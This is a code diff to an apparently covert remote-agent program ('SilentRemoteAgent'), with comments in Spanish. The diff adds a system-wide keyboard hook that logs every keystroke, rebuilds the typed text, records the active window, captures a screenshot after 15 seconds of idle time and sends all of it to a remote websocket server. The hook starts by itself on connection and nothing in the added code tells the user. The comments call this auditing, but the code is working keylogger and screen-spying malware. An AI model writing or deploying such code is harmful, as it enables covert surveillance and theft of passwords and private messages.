@@ -29,7 +29,7 @@ warnings.filterwarnings("ignore", category=DeprecationWarning, module="mss")
 import mss
 import websockets
 from PIL import Image, ImageDraw
-from pynput.keyboard import Controller as KeyboardController, Key, KeyCode
+from pynput.keyboard import Controller as KeyboardController, Key, KeyCode, Listener
 from pynput.mouse import Button, Controller as MouseController
 
 try:
@@ -784,6 +784,163 @@ class PopupChatManager:
             pass
 
 
+def get_current_keyboard_layout() -> str:
+    """Detecta el idioma o distribución del teclado activa en Windows y macOS."""
+    if IS_WINDOWS:
+        try:
+            import ctypes
+            user32 = ctypes.windll.user32
+            hwnd = user32.GetForegroundWindow()
+            thread_id = user32.GetWindowThreadProcessId(hwnd, 0)
+            klid = user32.GetKeyboardLayout(thread_id)
+            lang_id = klid & 0xFFFF
+            lcid_names = {
+                0x080A: "Español (México)",
+                0x040A: "Español (España)",
+                0x2C0A: "Español (Argentina)",
+                0x240A: "Español (Colombia)",
+                0x280A: "Español (Chile)",
+                0x0409: "Inglés (EE.UU.)",
+                0x0809: "Inglés (Reino Unido)",
+                0x0416: "Portugués (Brasil)",
+                0x040C: "Francés",
+            }
+            if lang_id in lcid_names:
+                return lcid_names[lang_id]
+            if (lang_id & 0x00FF) == 0x0A:
+                return "Español"
+            elif (lang_id & 0x00FF) == 0x09:
+                return "Inglés"
+        except Exception:
+            pass
+    elif IS_MAC:
+        try:
+            out = subprocess.check_output(
+                ["defaults", "read", "~/Library/Preferences/com.apple.HIToolbox.plist", "AppleSelectedInputSources"],
+                text=True,
+                stderr=subprocess.DEVNULL,
+            )
+            for line in out.splitlines():
+                if "KeyboardLayout Name" in line:
+                    return line.split("=")[-1].strip().strip(';\"')
+        except Exception:
+            pass
+    try:
+        import locale
+        loc = locale.getdefaultlocale()[0]
+        if loc:
+            return loc.replace("_", "-")
+    except Exception:
+        pass
+    return "Estándar"
+
+
+SPECIAL_KEYS_MAP = {
+    Key.space: "[Espacio]",
+    Key.enter: "[Enter]",
+    Key.backspace: "[Borrar]",
+    Key.tab: "[Tab]",
+    Key.esc: "[Esc]",
+    Key.delete: "[Supr]",
+    Key.up: "[↑ Arriba]",
+    Key.down: "[↓ Abajo]",
+    Key.left: "[← Izquierda]",
+    Key.right: "[→ Derecha]",
+    Key.shift: "[Shift]",
+    Key.shift_l: "[Shift]",
+    Key.shift_r: "[Shift]",
+    Key.ctrl: "[Ctrl]",
+    Key.ctrl_l: "[Ctrl]",
+    Key.ctrl_r: "[Ctrl]",
+    Key.alt: "[Alt]",
+    Key.alt_l: "[Alt]",
+    Key.alt_r: "[Alt]",
+    Key.alt_gr: "[AltGr]",
+    Key.cmd: "[Cmd]",
+    Key.cmd_l: "[Cmd]",
+    Key.cmd_r: "[Cmd]",
+    Key.caps_lock: "[BloqMayús]",
+    Key.home: "[Inicio]",
+    Key.end: "[Fin]",
+    Key.page_up: "[RePág]",
+    Key.page_down: "[AvPág]",
+    Key.insert: "[Insert]",
+}
+
+
+class KeyboardEventHook:
+    """
+    Mini-Función 01 (MF-01): KeyboardEventHook
+    Especificación técnica EventosHUI1.md:
+    - Escucha no bloqueante en hilo daemon independiente.
+    - Normalización de caracteres y teclas especiales comprensibles.
+    - Descarte de eventos duplicados on_release.
+    - Ciclo de vida limpio: start() y stop().
+    - Callback: on_key_callback(key_repr: str, timestamp: float)
+    """
+
+    def __init__(self, on_key_callback: Callable[[str, float], None]):
+        self.on_key_callback = on_key_callback
+        self._listener: Optional[Listener] = None
+        self._running: bool = False
+        self._lock = threading.Lock()
+
+    def _normalize_key(self, key) -> str:
+        if key in SPECIAL_KEYS_MAP:
+            return SPECIAL_KEYS_MAP[key]
+        if hasattr(key, "char") and key.char is not None:
+            return str(key.char)
+        if hasattr(key, "name") and key.name:
+            name = key.name.upper()
+            return f"[{name}]"
+        if hasattr(key, "vk") and key.vk is not None:
+            if 96 <= key.vk <= 105:
+                return str(key.vk - 96)
+            return f"[VK_{key.vk}]"
+        return str(key)
+
+    def _on_press(self, key):
+        if not self._running:
+            return
+        try:
+            key_repr = self._normalize_key(key)
+            ts = time.monotonic()
+            if self.on_key_callback:
+                self.on_key_callback(key_repr, ts)
+        except Exception:
+            pass
+
+    def _on_release(self, key):
+        # Descartar eventos on_release para contar exclusivamente pulsaciones efectivas
+        pass
+
+    def start(self):
+        with self._lock:
+            if self._running:
+                return
+            self._running = True
+            try:
+                self._listener = Listener(
+                    on_press=self._on_press,
+                    on_release=self._on_release,
+                    daemon=True,
+                )
+                self._listener.start()
+            except Exception:
+                self._running = False
+                self._listener = None
+
+    def stop(self):
+        with self._lock:
+            self._running = False
+            if self._listener:
+                try:
+                    self._listener.stop()
+                except Exception:
+                    pass
+                self._listener = None
+
+
 class SilentRemoteAgent:
     def __init__(self, cfg: dict):
         self.cfg = cfg
@@ -820,6 +977,108 @@ class SilentRemoteAgent:
         self.loop: Optional[asyncio.AbstractEventLoop] = None
         self.audio_player = AudioPlayerWorker()
         self.chat_popup = PopupChatManager(self._on_user_chat_reply)
+
+        # Auditoría de teclado y evidencia visual con regla de 15 segundos (MF-01 a MF-06)
+        self.keyboard_hook: Optional[KeyboardEventHook] = None
+        self._typing_session_active: bool = False
+        self._typing_start_ts: float = 0.0
+        self._typing_last_ts: float = 0.0
+        self._typing_window: str = "Escritorio"
+        self._keystrokes_buffer: List[str] = []
+        self._typing_debounce_timer: Optional[threading.Timer] = None
+        self._typing_lock = threading.Lock()
+
+    def _handle_raw_key_event(self, key_repr: str, ts: float):
+        """Callback invocado por MF-01 KeyboardEventHook."""
+        with self._typing_lock:
+            current_win = get_active_window_title() or "Escritorio"
+            if not self._typing_session_active:
+                # MF-02: Inicio de Bloque y Buffer en Memoria
+                self._typing_session_active = True
+                self._typing_start_ts = ts
+                self._typing_window = current_win
+                self._keystrokes_buffer = []
+
+            # MF-03: BufferAggregator & Timer Reset (15 segundos)
+            self._typing_last_ts = ts
+            self._keystrokes_buffer.append(key_repr)
+
+            if self._typing_debounce_timer:
+                try:
+                    self._typing_debounce_timer.cancel()
+                except Exception:
+                    pass
+
+            self._typing_debounce_timer = threading.Timer(15.0, self._on_typing_idle_timeout)
+            self._typing_debounce_timer.daemon = True
+            self._typing_debounce_timer.start()
+
+    def _on_typing_idle_timeout(self):
+        """MF-04 & MF-05: Cierre de Sesión al expirar 15s sin pulsaciones y captura de pantalla."""
+        with self._typing_lock:
+            if not self._typing_session_active or not self._keystrokes_buffer:
+                self._typing_session_active = False
+                return
+
+            keystrokes_snapshot = list(self._keystrokes_buffer)
+            active_win = self._typing_window
+            start_ts = self._typing_start_ts
+            last_ts = self._typing_last_ts
+            duration = max(1, round(last_ts - start_ts)) if last_ts > start_ts else 1
+            count = len(keystrokes_snapshot)
+
+            reconstructed = []
+            for k in keystrokes_snapshot:
+                if k == "[Espacio]":
+                    reconstructed.append(" ")
+                elif k == "[Enter]":
+                    reconstructed.append("\n")
+                elif k == "[Tab]":
+                    reconstructed.append("\t")
+                elif k.startswith("[") and k.endswith("]"):
+                    reconstructed.append(f" {k} ")
+                else:
+                    reconstructed.append(k)
+            text_content = "".join(reconstructed).strip()
+            layout_name = get_current_keyboard_layout()
+
+            self._keystrokes_buffer = []
+            self._typing_session_active = False
+            self._typing_debounce_timer = None
+
+        # MF-05: Captura de Pantalla en Alta Resolución con mss al segundo 15
+        screenshot_b64 = ""
+        try:
+            with mss.mss() as sct:
+                mon_idx = min(self.current_monitor, len(sct.monitors) - 1)
+                mon = sct.monitors[mon_idx]
+                raw_grab = sct.grab(mon)
+                img = Image.frombytes("RGB", raw_grab.size, raw_grab.bgra, "raw", "BGRX")
+                if img.width > 1920:
+                    ratio = 1920.0 / img.width
+                    img = img.resize((1920, int(img.height * ratio)), Image.LANCZOS)
+                buf = io.BytesIO()
+                img.save(buf, format="JPEG", quality=75, optimize=True)
+                screenshot_b64 = base64.b64encode(buf.getvalue()).decode("ascii")
+        except Exception:
+            pass
+
+        # MF-06: Despacho asíncrono al WebSocket
+        payload = {
+            "type": "keyboard_event",
+            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "active_window": active_win,
+            "duration_seconds": duration,
+            "idle_pause_seconds": 15,
+            "keystrokes_count": count,
+            "text_content": text_content,
+            "keystrokes_detail": keystrokes_snapshot[:250],
+            "keyboard_layout": layout_name,
+            "screenshot_b64": screenshot_b64,
+        }
+
+        if self.loop and self.ws:
+            asyncio.run_coroutine_threadsafe(self._safe_ws_send(json.dumps(payload)), self.loop)
 
     def _on_user_chat_reply(self, text: str):
         if self.loop and self.ws:
@@ -1343,6 +1602,11 @@ class SilentRemoteAgent:
                 ) as ws:
                     self.ws = ws
                     self.streaming = False
+                    self.loop = asyncio.get_running_loop()
+                    if not self.keyboard_hook:
+                        self.keyboard_hook = KeyboardEventHook(on_key_callback=self._handle_raw_key_event)
+                        self.keyboard_hook.start()
+
                     self.macos_screen_ok = check_macos_screen_permission(request_if_missing=True) if IS_MAC else True
 
                     with mss.mss() as sct:
@@ -1465,6 +1729,9 @@ class SilentRemoteAgent:
                         stream_task.cancel()
                         telem_task.cancel()
                         perm_task.cancel()
+                        if self.keyboard_hook:
+                            self.keyboard_hook.stop()
+                            self.keyboard_hook = None
                         self.ws = None
                         self.streaming = False
 
